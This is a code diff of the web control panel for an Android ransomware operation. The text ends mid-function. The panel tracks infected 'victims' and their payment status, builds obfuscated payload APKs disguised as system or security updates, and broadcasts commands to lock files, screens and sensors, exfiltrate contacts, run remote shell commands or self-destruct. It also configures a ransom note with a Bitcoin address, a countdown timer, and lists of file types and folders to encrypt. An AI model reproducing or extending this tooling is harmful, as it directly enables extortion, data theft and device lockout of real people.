-            <option value="xlsx">Excel Spreadsheet</option>
-            <option value="image">Image (JPG/PNG)</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label>Carrier Name (shown to victim)</label>
-          <input type="text" id="builderName" value="Security_Update_July_2026.apk">
-        </div>
-        <button class="btn btn-primary" onclick="buildPayload()">🔨 Generate Payload</button>
-        <div id="builderResult" class="mt-4 hidden">
-          <div class="text-sm text-dim">Payload ready:</div>
-          <a href="#" id="builderDownloadLink" class="btn btn-primary btn-sm mt-4">⬇ Download Payload</a>
-          <pre id="builderPayloadCode" class="mt-4" style="background:#000;padding:12px;border-radius:8px;font-size:11px;max-height:400px;overflow:auto;"></pre>
-        </div>
-      </div>
-      <div class="card">
-        <h3 class="mb-4">⚡ Quick Commands</h3>
-        <p class="text-sm text-dim mb-4">Broadcast a command to all active victims</p>
-        <div class="form-group">
-          <label>Select All Victims</label>
-          <select id="broadcastVictim">
-            <option value="__ALL__">All Active Victims</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label>Command</label>
-          <select id="broadcastCmd">
-            <option value="lock_files">🔒 Lock Files</option>
-            <option value="lock_screen">📱 Lock Screen (Overlay)</option>
-            <option value="lock_full">⛔ Full Device Lock</option>
-            <option value="lock_apps">📲 Lock Apps</option>
-            <option value="lock_sensors">📡 Disable Sensors</option>
-            <option value="unlock">🔓 Unlock / Decrypt</option>
-            <option value="status">📊 Get Status</option>
-            <option value="exfil">📤 Exfiltrate Data</option>
-          </select>
-        </div>
-        <button class="btn btn-danger" onclick="broadcastCommand()">🚀 Execute Command</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- PAGE: CONFIG -->
-  <div id="page-config" class="hidden">
-    <div class="grid-2">
-      <div class="card">
-        <h3 class="mb-4">🎭 Ransom Note Configuration</h3>
-        <div class="form-group">
-          <label>Title</label>
-          <input type="text" id="cfgTitle" value="YOUR DEVICE HAS BEEN LOCKED">
-        </div>
-        <div class="form-group">
-          <label>Message</label>
-          <textarea id="cfgMessage" rows="3">All your files have been encrypted with AES-256-GCM.
-Contact us for decryption instructions.</textarea>
-        </div>
-        <div class="form-group">
-          <label>Bitcoin Amount</label>
-          <input type="number" id="cfgBtcAmount" value="0.5" step="0.01">
-        </div>
-        <div class="form-group">
-          <label>Bitcoin Address</label>
-          <input type="text" id="cfgBtcAddr" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh">
-        </div>
-        <div class="form-group">
-          <label>Contact Email</label>
-          <input type="text" id="cfgEmail" value="support@onionmail.com">
-        </div>
-        <div class="form-group">
-          <label>Timer (Hours)</label>
-          <input type="number" id="cfgTimer" value="72">
-        </div>
-        <button class="btn btn-primary" onclick="saveRansomConfig()">Save Ransom Config</button>
-      </div>
-      <div class="card">
-        <h3 class="mb-4">🔐 Encryption Target Config</h3>
-        <div class="form-group">
-          <label>Target File Extensions (JSON array)</label>
-          <textarea id="cfgExtensions" rows="4">[".txt",".doc",".docx",".xls",".xlsx",".pdf",".jpg",".jpeg",".png",".gif",".mp4",".mp3",".zip",".rar",".7z",".db",".sqlite",".csv",".ppt",".pptx",".odt",".ods",".odp",".rtf",".html",".htm",".php",".js",".py",".sql"]</textarea>
-        </div>
-        <div class="form-group">
-          <label>Target Directories (JSON array)</label>
-          <textarea id="cfgDirs" rows="3">["/sdcard/Documents","/sdcard/Download","/sdcard/Pictures","/sdcard/DCIM","/sdcard/Music","/sdcard/Movies"]</textarea>
-        </div>
-        <div class="form-group">
-          <label>Default Lock Mode</label>
-          <select id="cfgLockMode">
-            <option value="files">Files Only</option>
-            <option value="screen">Screen Lock</option>
-            <option value="full">Full Device Lock</option>
-            <option value="sensors">Sensor Block</option>
-            <option value="apps">App Lock</option>
-          </select>
-        </div>
-        <button class="btn btn-primary" onclick="saveTargetConfig()">Save Target Config</button>
-      </div>
-    </div>
-  </div>
-
+<div class="header">
+<div><h1 id="pageTitle">Dashboard</h1><div class="sub" id="pageSub">Real-time command & control</div></div>
+<div class="flex gap-2 ac"><span class="t-sm t-dim" id="connStatus">&#9679; Connecting...</span></div>
 </div>
 
-<!-- VICTIM DETAIL MODAL -->
+<!-- PAGE: DASHBOARD -->
+<div id="page-dashboard">
+<div class="cards">
+<div class="card"><div class="lbl">Victims Online</div><div class="val primary" id="dOnline">0</div></div>
+<div class="card"><div class="lbl">Total Infected</div><div class="val" id="dTotal">0</div></div>
+<div class="card"><div class="lbl">Currently Locked</div><div class="val danger" id="dLocked">0</div></div>
+<div class="card"><div class="lbl">Ransom Paid</div><div class="val success" id="dPaid">0</div></div>
+</div>
+<div class="tabs">
+<button class="active" data-tab="recent">Recent Activity</button>
+<button data-tab="live">Live Log</button>
+</div>
+<div id="tab-recent">
+<div class="table-wrap">
+<table><thead><tr><th>Victim</th><th>Event</th><th>Details</th><th>Time</th></tr></thead>
+<tbody id="recentEvents"></tbody></table>
+</div></div>
+<div id="tab-live" class="hidden">
+<div class="log-box" id="liveLog"></div>
+</div>
+</div>
+
+<!-- PAGE: VICTIMS -->
+<div id="page-victims" class="hidden">
+<div class="table-wrap">
+<table><thead><tr>
+<th>ID</th><th>Device</th><th>Android</th><th>IP</th><th>Channel</th><th>Status</th><th>Lock</th><th>Battery</th><th>Last Seen</th><th>Actions</th>
+</tr></thead>
+<tbody id="victimsTable"></tbody></table>
+</div>
+</div>
+
+<!-- PAGE: BUILDER -->
+<div id="page-builder" class="hidden">
+<div class="g2">
+<div class="card">
+<h3 class="mb">&#128295; Payload Builder</h3>
+<div class="fg"><label>C2 Host</label><input type="text" id="bHost" value="localhost"></div>
+<div class="fg"><label>C2 Port</label><input type="number" id="bPort" value="8443"></div>
+<div class="fg"><label>SSL</label><select id="bSSL"><option value="true">Yes</option><option value="false">No</option></select></div>
+<div class="fg"><label>Lock Mode</label><select id="bLock"><option value="full">Full (encrypt + lock + sensors)</option><option value="files">Files Only</option><option value="screen">Screen Lock</option><option value="sensors">Sensor Block</option></select></div>
+<div class="fg"><label>Obfuscation</label><select id="bObf"><option value="aes">AES Encrypted</option><option value="xor">XOR + Base64</option><option value="base64">Base64 Only</option></select></div>
+<div class="fg"><label>Output Name</label><input type="text" id="bName" value="System_Update.apk"></div>
+<button class="btn btn-primary" onclick="buildPayload()">&#128295; Generate Payload</button>
+<div id="bResult" class="hidden mt">
+<div class="t-sm t-dim">Payload generated:</div>
+<a href="#" id="bDownload" class="btn btn-primary btn-sm mt">&#8595; Download</a>
+<pre id="bCode" class="mt" style="background:#000;padding:10px;border-radius:6px;font-size:10px;max-height:300px;overflow:auto;"></pre>
+</div>
+</div>
+<div class="card">
+<h3 class="mb">&#9889; Quick Broadcast</h3>
+<div class="fg"><label>Target</label><select id="bcVictim"><option value="__ALL__">All Active Victims</option></select></div>
+<div class="fg"><label>Command</label>
+<select id="bcCmd">
+<option value="lock_files">&#128274; Lock Files</option>
+<option value="lock_screen">&#128241; Lock Screen</option>
+<option value="lock_full">&#9940; Full Lockdown</option>
+<option value="lock_sensors">&#128200; Disable Sensors</option>
+<option value="unlock">&#128275; Unlock/Decrypt</option>
+<option value="status">&#128200; Get Status</option>
+<option value="exfil">&#128230; Exfiltrate Data</option>
+<option value="self_destruct">&#9760; Self Destruct</option>
+</select>
+</div>
+<button class="btn btn-danger" onclick="broadcastCmd()">&#128640; Execute</button>
+</div>
+</div>
+</div>
+
+<!-- PAGE: EXFIL -->
+<div id="page-exfil" class="hidden">
+<div class="table-wrap">
+<table><thead><tr><th>Victim</th><th>Type</th><th>Size</th><th>Received</th><th>Content Preview</th></tr></thead>
+<tbody id="exfilTable"></tbody></table>
+</div>
+</div>
+
+<!-- PAGE: CONFIG -->
+<div id="page-config" class="hidden">
+<div class="g2">
+<div class="card">
+<h3 class="mb">&#127912; Ransom Note</h3>
+<div class="fg"><label>Title</label><input type="text" id="cfgTitle" value="YOUR DEVICE HAS BEEN ENCRYPTED"></div>
+<div class="fg"><label>Message</label><textarea id="cfgMsg" rows="2">All files encrypted with AES-256.\nContact for decryption.</textarea></div>
+<div class="fg"><label>BTC Amount</label><input type="number" id="cfgBtc" value="0.5" step="0.01"></div>
+<div class="fg"><label>BTC Address</label><input type="text" id="cfgAddr" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"></div>
+<div class="fg"><label>Email</label><input type="text" id="cfgEmail" value="support@onionmail.com"></div>
+<div class="fg"><label>Timer (hours)</label><input type="number" id="cfgTimer" value="72"></div>
+<button class="btn btn-primary" onclick="saveRansom()">Save</button>
+</div>
+<div class="card">
+<h3 class="mb">&#128220; Targets</h3>
+<div class="fg"><label>Extensions</label><textarea id="cfgExt" rows="3">[".txt",".doc",".docx",".pdf",".jpg",".png",".mp4",".zip",".db",".sqlite",".csv",".ppt",".html",".php",".js",".py",".sql"]</textarea></div>
+<div class="fg"><label>Directories</label><textarea id="cfgDir" rows="2">["/sdcard/Documents","/sdcard/Download","/sdcard/Pictures","/sdcard/DCIM","/sdcard/Music","/sdcard/Movies"]</textarea></div>
+<button class="btn btn-primary" onclick="saveTargets()">Save</button>
+</div>
+</div>
+</div>
+</div>
+
+<!-- VICTIM MODAL -->
 <div class="modal-overlay" id="victimModal">
-  <div class="modal">
-    <h2>🎯 Victim Details</h2>
-    <div id="victimDetailContent"></div>
-    <div class="form-group">
-      <label>Send Command</label>
-      <select id="modalCmd">
-        <option value="lock_files">🔒 Lock Files</option>
-        <option value="lock_screen">📱 Lock Screen</option>
-        <option value="lock_full">⛔ Full Lock</option>
-        <option value="lock_apps">📲 Lock Apps</option>
-        <option value="lock_sensors">📡 Disable Sensors</option>
-        <option value="unlock">🔓 Unlock/Decrypt</option>
-        <option value="status">📊 Get Status</option>
-        <option value="exfil">📤 Exfiltrate</option>
-      </select>
-    </div>
-    <div class="btn-row">
-      <button class="btn btn-ghost" onclick="closeVictimModal()">Close</button>
-      <button class="btn btn-danger" onclick="sendCommandToVictim()">Send Command</button>
-    </div>
-    <div class="mt-4">
-      <h4>Event Log</h4>
-      <div class="log-viewer" id="victimEventLog" style="max-height:200px;margin-top:8px;"></div>
-    </div>
-  </div>
+<div class="modal">
+<h2>&#127919; Victim Details</h2>
+<div id="vDetail"></div>
+<div class="fg"><label>Send Command</label>
+<select id="vCmd">
+<option value="lock_files">&#128274; Lock Files</option>
+<option value="lock_screen">&#128241; Lock Screen</option>
+<option value="lock_full">&#9940; Full Lockdown</option>
+<option value="lock_sensors">&#128200; Disable Sensors</option>
+<option value="unlock">&#128275; Unlock/Decrypt</option>
+<option value="status">&#128200; Get Status</option>
+<option value="exfil">&#128230; Exfiltrate (contacts)</option>
+<option value="self_destruct">&#9760; Self Destruct</option>
+<option value="exec">&#128187; Exec Shell</option>
+</select>
+</div>
+<div class="fg" id="vExecExtra" class="hidden"><label>Shell Command</label><input type="text" id="vExecCmd" placeholder="e.g., ls -la /sdcard/"></div>
+<div class="br">
+<button class="btn btn-ghost" onclick="closeVM()">Close</button>
+<button class="btn btn-danger" onclick="sendVicCmd()">Send Command</button>
+</div>
+<div class="mt"><h4 class="t-sm t-dim mb">Event Log</h4>
+<div class="log-box" id="vLog" style="max-height:180px;"></div>
+</div>
+</div>
 </div>
 
 <script>
-const socket = io(window.location.origin, {
-  transports: ['websocket', 'polling'],
-  reconnection: true,
-  reconnectionDelay: 1000,
-  reconnectionAttempts: Infinity
-});
+const socket = io(window.location.origin, {transports:['websocket','polling'],reconnection:true});
 
-let currentVictimId = null;
 let victims = {};
+let currentVic = null;
 
-// Connection status
-socket.on('connect', () => {
-  document.getElementById('connectionStatus').textContent = '● Connected';
-  document.getElementById('connectionStatus').style.color = 'var(--success)';
+socket.on('connect', ()=>{
+  document.getElementById('connStatus').textContent = '● Connected';
+  document.getElementById('connStatus').style.color = 'var(--success)';
 });
-socket.on('disconnect', () => {
-  document.getElementById('connectionStatus').textContent = '● Disconnected';
-  document.getElementById('connectionStatus').style.color = 'var(--danger)';
-});
-
-// Real-time victim updates
-socket.on('victim_update', (data) => {
-  victims[data.id] = data;
-  updateVictimsTable();
-  updateDashboardStats();
-  updateSidebarStats();
-  addLogEntry(data.id + ' status: ' + data.status, 'info');
+socket.on('disconnect', ()=>{
+  document.getElementById('connStatus').textContent = '● Disconnected';
+  document.getElementById('connStatus').style.color = 'var(--danger)';
 });
 
-socket.on('victim_event', (data) => {
-  addRecentEvent(data);
-  addLogEntry(data.details || data.event_type, data.event_type === 'error' ? 'error' : 'info');
+socket.on('victim_update', (d)=>{
+  victims[d.id] = d;
+  updateAll();
+  addLog(d.id.slice(0,8)+' status: '+d.status, 'sys');
 });
 
-socket.on('command_result', (data) => {
-  addLogEntry('Command ' + data.command + ' on ' + data.victim_id + ': ' + (data.result || 'done'), 'system');
-  if (currentVictimId === data.victim_id) loadVictimEvents(data.victim_id);
+socket.on('victim_event', (d)=>{
+  addRecent(d);
+  addLog(d.details||d.event_type, d.event_type==='error'?'err':'info');
 });
 
-socket.on('initial_state', (data) => {
-  victims = data.victims || {};
-  updateVictimsTable();
-  updateDashboardStats();
-  updateSidebarStats();
-  data.events?.forEach(e => addRecentEvent(e));
-  // Populate broadcast victim select
-  const sel = document.getElementById('broadcastVictim');
-  sel.innerHTML = '<option value="__ALL__">All Active Victims</option>';
-  Object.values(victims).forEach(v => {
-    const opt = document.createElement('option');
-    opt.value = v.id;
-    opt.textContent = v.id.slice(0,8)+'... - '+v.device_name;
-    sel.appendChild(opt);
-  });
+socket.on('command_result', (d)=>{
+  addLog('Cmd '+d.command+' on '+d.victim_id.slice(0,8)+': '+(d.result||'done'), 'sys');
+  if(currentVic===d.victim_id) loadVEvents(d.victim_id);
 });
 
-// Page navigation
-document.querySelectorAll('.sidebar nav a').forEach(a => {
-  a.addEventListener('click', (e) => {
+socket.on('initial_state', (d)=>{
+  victims = d.victims||{};
+  updateAll();
+  (d.events||[]).forEach(e=>addRecent(e));
+  updateBcSelect();
+});
+
+// Page nav
+document.querySelectorAll('.sidebar nav a').forEach(a=>{
+  a.addEventListener('click', (e)=>{
     e.preventDefault();
-    document.querySelectorAll('.sidebar nav a').forEach(x => x.classList.remove('active'));
+    document.querySelectorAll('.sidebar nav a').forEach(x=>x.classList.remove('active'));
     a.classList.add('active');
     const page = a.dataset.page;
-    document.querySelectorAll('.main > div[id^="page-"]').forEach(p => p.classList.add('hidden'));
+    document.querySelectorAll('[id^="page-"]').forEach(p=>p.classList.add('hidden'));
     document.getElementById('page-'+page).classList.remove('hidden');
     document.getElementById('pageTitle').textContent = a.textContent.trim();
-    if (page === 'config') loadConfig();
-    if (page === 'victims') updateVictimsTable();
+    if(page==='config') loadConfig();
+    if(page==='exfil') loadExfil();
   });
 });
 
-// Tab switching
-document.querySelectorAll('.tab-bar .tab').forEach(tab => {
-  tab.addEventListener('click', () => {
-    document.querySelectorAll('.tab-bar .tab').forEach(t => t.classList.remove('active'));
-    tab.classList.add('active');
-    const tabId = tab.dataset.tab;
-    document.querySelectorAll('[id^="tab-"]').forEach(t => t.classList.add('hidden'));
-    document.getElementById('tab-'+tabId).classList.remove('hidden');
+// Tab switch
+document.querySelectorAll('.tabs button').forEach(b=>{
+  b.addEventListener('click', ()=>{
+    document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active'));
+    b.classList.add('active');
+    const id = b.dataset.tab;
+    document.querySelectorAll('[id^="tab-"]').forEach(t=>t.classList.add('hidden'));
+    document.getElementById('tab-'+id).classList.remove('hidden');
   });
 });
 
-function updateVictimsTable() {
-  const tbody = document.getElementById('victimsTable');
-  const vals = Object.values(victims);
-  if (vals.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;padding:32px;color:var(--text-dim)">No victims yet. Deploy a payload to get started.</td></tr>';
-    return;
-  }
-  tbody.innerHTML = vals.map(v => {
-    const statusClass = v.status === 'locked' ? 'locked' : (v.status === 'paid' ? 'paid' : (v.status === 'active' ? 'active' : 'offline'));
-    const lockIcon = v.lock_mode === 'files' ? '🔒' : (v.lock_mode === 'screen' ? '📱' : (v.lock_mode === 'full' ? '⛔' : (v.lock_mode === 'sensors' ? '📡' : (v.lock_mode === 'apps' ? '📲' : '○'))));
-    return `<tr onclick="openVictimModal('${v.id}')">
-      <td style="font-family:monospace;font-size:12px">${v.id.slice(0,8)}...</td>
-      <td>${v.device_name || 'Unknown'}</td>
-      <td>${v.android_version || '?'} (SDK ${v.sdk_level || '?'})</td>
-      <td>${v.ip || '?'}</td>
-      <td><span class="status-badge ${statusClass}">${v.status}</span></td>
-      <td>${lockIcon} ${v.lock_mode}</td>
-      <td style="font-size:12px;color:var(--text-dim)">${v.last_seen ? new Date(v.last_seen).toLocaleString() : '?'}</td>
-      <td><button class="btn btn-sm btn-ghost" onclick="event.stopPropagation();openVictimModal('${v.id}')">Details</button></td>
+// Victim modal command change
+document.getElementById('vCmd').addEventListener('change', function(){
+  document.getElementById('vExecExtra').classList.toggle('hidden', this.value!=='exec');
+});
+
+function updateAll(){
+  updateTable(); updateStats(); updateSidebar(); updateBcSelect();
+}
+
+function updateStats(){
+  const v = Object.values(victims);
+  document.getElementById('dOnline').textContent = v.filter(x=>x.status==='active'||x.status==='locked').length;
+  document.getElementById('dTotal').textContent = v.length;
+  document.getElementById('dLocked').textContent = v.filter(x=>x.status==='locked').length;
+  document.getElementById('dPaid').textContent = v.filter(x=>x.status==='paid').length;
+}
+
+function updateSidebar(){
+  const v = Object.values(victims);
+  document.getElementById('sOnline').textContent = v.filter(x=>x.status==='active'||x.status==='locked').length;
+  document.getElementById('sTotal').textContent = v.length;
+  document.getElementById('sLocked').textContent = v.filter(x=>x.status==='locked').length;
+  document.getElementById('sPaid').textContent = v.filter(x=>x.status==='paid').length;
+}
+
+function updateTable(){
+  const t = document.getElementById('victimsTable');
+  const v = Object.values(victims);
+  if(!v.length){t.innerHTML='<tr><td colspan="10" style="text-align:center;padding:24px;color:var(--text-dim)">No victims. Deploy payload.</td></tr>';return;}
+  const icons = {files:'🔒',screen:'📱',full:'⛔',sensors:'📡',apps:'📲'};
+  t.innerHTML = v.map(x=>{
+    const cls = x.status==='locked'?'locked':(x.status==='paid'?'paid':(x.status==='active'?'active':'offline'));
+    return `<tr onclick="openVM('${x.id}')">
+      <td style="font-family:monospace;font-size:11px">${x.id.slice(0,8)}...</td>
+      <td>${x.device_name||'?'}</td>
+      <td>${x.android_version||'?'}</td>
+      <td>${x.ip||'?'}</td>
+      <td>${x.channel||'?'}</td>
+      <td><span class="badge ${cls}">${x.status}</span></td>
+      <td>${icons[x.lock_mode]||'○'} ${x.lock_mode||'none'}</td>
+      <td>${x.battery||'?'}%</td>
+      <td class="t-dim t-sm">${x.last_seen?new Date(x.last_seen).toLocaleString():'?'}</td>
+      <td><button class="btn btn-sm btn-ghost" onclick="event.stopPropagation();openVM('${x.id}')">Details</button></td>
     </tr>`;
   }).join('');
 }
 
-function updateDashboardStats() {
-  const vals = Object.values(victims);
-  document.getElementById('dashOnline').textContent = vals.filter(v => v.status === 'active' || v.status === 'locked').length;
-  document.getElementById('dashTotal').textContent = vals.length;
-  document.getElementById('dashLocked').textContent = vals.filter(v => v.status === 'locked').length;
-  document.getElementById('dashPaid').textContent = vals.filter(v => v.status === 'paid').length;
+function updateBcSelect(){
+  const s = document.getElementById('bcVictim');
+  s.innerHTML = '<option value="__ALL__">All Active Victims</option>';
+  Object.values(victims).forEach(v=>{
+    const o = document.createElement('option');
+    o.value=v.id; o.textContent=v.id.slice(0,8)+'... - '+v.device_name;
+    s.appendChild(o);
+  });
 }
 
-function updateSidebarStats() {
-  const vals = Object.values(victims);
-  document.getElementById('statOnline').textContent = vals.filter(v => v.status === 'active' || v.status === 'locked').length;
-  document.getElementById('statTotal').textContent = vals.length;
-  document.getElementById('statLocked').textContent = vals.filter(v => v.status === 'locked').length;
-  document.getElementById('statPaid').textContent = vals.filter(v => v.status === 'paid').length;
-}
-
-function addRecentEvent(event) {
-  const tbody = document.getElementById('recentEvents');
+function addRecent(ev){
+  const t = document.getElementById('recentEvents');
   const tr = document.createElement('tr');
-  tr.innerHTML = `<td style="font-family:monospace;font-size:12px">${event.victim_id?.slice(0,8)||'?'}...</td>
-    <td>${event.event_type}</td>
-    <td>${event.details || ''}</td>
-    <td style="font-size:12px;color:var(--text-dim)">${event.timestamp ? new Date(event.timestamp).toLocaleString() : '?'}</td>`;
-  tbody.prepend(tr);
-  while (tbody.children.length > 50) tbody.removeChild(tbody.lastChild);
+  tr.innerHTML = `<td style="font-family:monospace;font-size:11px">${(ev.victim_id||'?').slice(0,8)}...</td>
+    <td>${ev.event_type}</td><td>${ev.details||''}</td>
+    <td class="t-sm t-dim">${ev.timestamp?new Date(ev.timestamp).toLocaleString():'?'}</td>`;
+  t.prepend(tr);
+  while(t.children.length>50) t.removeChild(t.lastChild);
 }
 
-function addLogEntry(text, type = 'info') {
-  const log = document.getElementById('liveLog');
-  const entry = document.createElement('div');
-  entry.className = 'log-entry ' + type;
-  entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + text;
-  log.appendChild(entry);
-  log.scrollTop = log.scrollHeight;
-  while (log.children.length > 200) log.removeChild(log.firstChild);
+function addLog(text, type='info'){
+  const l = document.getElementById('liveLog');
+  const d = document.createElement('div');
+  d.className = 'entry '+type;
+  d.textContent = '['+new Date().toLocaleTimeString()+'] '+text;
+  l.appendChild(d);
+  l.scrollTop = l.scrollHeight;
+  while(l.children.length>200) l.removeChild(l.firstChild);
 }
 
-function openVictimModal(id) {
-  currentVictimId = id;
+function openVM(id){
+  currentVic = id;
   const v = victims[id];
-  if (!v) return;
-  document.getElementById('victimDetailContent').innerHTML = `
-    <div class="grid-2">
-      <div><strong>ID:</strong><br><span style="font-family:monospace;font-size:12px">${v.id}</span></div>
-      <div><strong>Device:</strong><br>${v.device_name || 'Unknown'} (${v.manufacturer||'?'} ${v.model||'?'})</div>
+  if(!v) return;
+  document.getElementById('vDetail').innerHTML = `
+    <div class="g2 t-sm">
+      <div><strong>ID:</strong><br><span style="font-family:monospace">${v.id}</span></div>
+      <div><strong>Device:</strong><br>${v.device_name||'?'} (${v.manufacturer||'?'} ${v.model||'?'})</div>
       <div><strong>Android:</strong><br>${v.android_version||'?'} (SDK ${v.sdk_level||'?'})</div>
-      <div><strong>IP:</strong><br>${v.ip || '?'}</div>
-      <div><strong>Status:</strong><br><span class="status-badge ${v.status}">${v.status}</span></div>
-      <div><strong>Lock Mode:</strong><br>${v.lock_mode || 'none'}</div>
-      <div><strong>First Seen:</strong><br>${v.first_seen ? new Date(v.first_seen).toLocaleString() : '?'}</div>
-      <div><strong>Last Seen:</strong><br>${v.last_seen ? new Date(v.last_seen).toLocaleString() : '?'}</div>
+      <div><strong>Channel:</strong><br>${v.channel||'?'}</div>
+      <div><strong>Status:</strong><br><span class="badge ${v.status}">${v.status}</span></div>
+      <div><strong>Lock:</strong><br>${v.lock_mode||'none'}</div>
+      <div><strong>Battery:</strong><br>${v.battery||'?'}%</div>
+      <div><strong>Paid:</strong><br>${v.ransom_paid?'✅ YES':'❌ NO'}</div>
     </div>
-    <div class="mt-4"><strong>Ransom Paid:</strong> ${v.ransom_paid ? '✅ YES' : '❌ NO'}</div>
   `;
   document.getElementById('victimModal').classList.add('active');
-  loadVictimEvents(id);
+  loadVEvents(id);
 }
 
-function closeVictimModal() {
+function closeVM(){
   document.getElementById('victimModal').classList.remove('active');
-  currentVictimId = null;
+  currentVic = null;
 }
 
-function loadVictimEvents(id) {
-  fetch('/api/victim/'+id+'/events')
-    .then(r => r.json())
-    .then(events => {
-      const log = document.getElementById('victimEventLog');
-      log.innerHTML = events.map(e =>
-        '<div class="log-entry '+(e.event_type==='error'?'error':'info')+'">['+new Date(e.timestamp).toLocaleString()+'] '+e.event_type+': '+e.details+'</div>'
-      ).join('') || '<div class="text-dim">No events</div>';
-    });
-}
-
-function sendCommandToVictim() {
-  if (!currentVictimId) return;
-  const cmd = document.getElementById('modalCmd').value;
-  fetch('/api/command', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({victim_id: currentVictimId, command: cmd})
-  }).then(r => r.json()).then(res => {
-    addLogEntry('Command '+cmd+' sent to '+currentVictimId.slice(0,8), 'system');
+function loadVEvents(id){
+  fetch('/api/victim/'+id+'/events').then(r=>r.json()).then(ev=>{
+    const l = document.getElementById('vLog');
+    l.innerHTML = ev.map(e=>
+      '<div class="entry '+(e.event_type==='error'?'err':'info')+'">['+
+      new Date(e.timestamp).toLocaleString()+'] '+e.event_type+': '+e.details+'</div>'
+    ).join('') || '<div class="t-dim">No events</div>';
   });
 }
 
-function broadcastCommand() {
-  const victimId = document.getElementById('broadcastVictim').value;
-  const cmd = document.getElementById('broadcastCmd').value;
-  fetch('/api/command', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({victim_id: victimId, command: cmd})
-  }).then(r => r.json()).then(res => {
-    addLogEntry('Broadcast command '+cmd+' sent', 'system');
-  });
+function sendVicCmd(){
+  if(!currentVic) return;
+  const cmd = document.getElementById('vCmd').value;
+  const params = {};
+  if(cmd==='exec') params.cmd = document.getElementById('vExecCmd').value;
+  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({victim_id:currentVic,command:cmd,params:params})
+  }).then(r=>r.json()).then(r=>addLog('Cmd '+cmd+' sent','sys'));
 }
 
-function buildPayload() {
-  const data = {
-    host: document.getElementById('builderHost').value,
-    port: parseInt(document.getElementById('builderPort').value),
-    ssl: document.getElementById('builderSSL').value === 'true',
-    lock_mode: document.getElementById('builderLockMode').value,
-    persistence: document.getElementById('builderPersist').value,
-    obfuscation: document.getElementById('builderObfuscation').value,
-    carrier: document.getElementById('builderCarrier').value,
-    name: document.getElementById('builderName').value
+function broadcastCmd(){
+  const id = document.getElementById('bcVictim').value;
+  const cmd = document.getElementById('bcCmd').value;
+  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({victim_id:id,command:cmd,params:{}})
+  }).then(r=>r.json()).then(r=>addLog('Broadcast: '+cmd,'sys'));
+}
+
+function buildPayload(){
+  const d = {
+    host: document.getElementById('bHost').value,
+    port: parseInt(document.getElementById('bPort').value),
+    ssl: document.getElementById('bSSL').value==='true',
+    lock_mode: document.getElementById('bLock').value,
+    obfuscation: document.getElementById('bObf').value,
+    name: document.getElementById('bName').value
   };
-  fetch('/api/build', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify(data)
-  }).then(r => r.json()).then(res => {
-    if (res.error) { alert(res.error); return; }
-    document.getElementById('builderResult').classList.remove('hidden');
-    document.getElementById('builderDownloadLink').href = res.download_url;
-    document.getElementById('builderPayloadCode').textContent = res.payload_code || 'Payload generated.';
+  fetch('/api/build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
+  .then(r=>r.json()).then(res=>{
+    if(res.error){alert(res.error);return;}
+    document.getElementById('bResult').classList.remove('hidden');
+    document.getElementById('bDownload').href = res.download_url;
+    document.getElementById('bCode').textContent = res.payload_code||'Payload ready.';
   });
 }
 
-function saveRansomConfig() {
-  const data = {
+function saveRansom(){
+  const d = {
     title: document.getElementById('cfgTitle').value,
-    message: document.getElementById('cfgMessage').value,
-    amount_btc: parseFloat(document.getElementById('cfgBtcAmount').value),
-    btc_address: document.getElementById('cfgBtcAddr').value,
+    message: document.getElementById('cfgMsg').value,
+    amount_btc: parseFloat(document.getElementById('cfgBtc').value),
+    btc_address: document.getElementById('cfgAddr').value,
     email: document.getElementById('cfgEmail').value,
     timer_hours: parseInt(document.getElementById('cfgTimer').value)
   };
-  fetch('/api/config/ransom_note_template', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify(data)
-  }).then(r => r.json()).then(res => {
-    if (res.success) addLogEntry('Ransom config saved', 'system');
-  });
+  fetch('/api/config/ransom',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
+  .then(r=>r.json()).then(r=>{if(r.success)addLog('Ransom config saved','sys')});
 }
 
-function saveTargetConfig() {
-  const data = {
-    encrypt_extensions: JSON.parse(document.getElementById('cfgExtensions').value),
-    target_dirs: JSON.parse(document.getElementById('cfgDirs').value),
-    default_lock_mode: document.getElementById('cfgLockMode').value
+function saveTargets(){
+  const d = {
+    encrypt_extensions: JSON.parse(document.getElementById('cfgExt').value),
+    target_dirs: JSON.parse(document.getElementById('cfgDir').value)
   };
-  fetch('/api/config/target', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify(data)
-  }).then(r => r.json()).then(res => {
-    if (res.success) addLogEntry('Target config saved', 'system');
-  });
+  fetch('/api/config/targets',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
+  .then(r=>r.json()).then(r=>{if(r.success)addLog('Target config saved','sys')});
 }
 
-function loadConfig() {
-  fetch('/api/config').then(r=>r.json()).then(cfg => {
-    if (cfg.ransom_note) {
-      document.getElementById('cfgTitle').value = cfg.ransom_note.title || '';
-      document.getElementById('cfgMessage').value = cfg.ransom_note.message || '';
-      document.getElementById('cfgBtcAmount').value = cfg.ransom_note.amount_btc || 0.5;
-      document.getElementById('cfgBtcAddr').value = cfg.ransom_note.btc_address || '';
-      document.getElementById('cfgEmail').value = cfg.ransom_note.email || '';
-      document.getElementById('cfgTimer').value = cfg.ransom_note.timer_hours || 72;
+function loadConfig(){
+  fetch('/api/config').then(r=>r.json()).then(cfg=>{
+    if(cfg.ransom){
+      document.getElementById('cfgTitle').value = cfg.ransom.title||'';
+      document.getElementById('cfgMsg').value = cfg.ransom.message||'';
+      document.getElementById('cfgBtc').value = cfg.ransom.amount_btc||0.5;
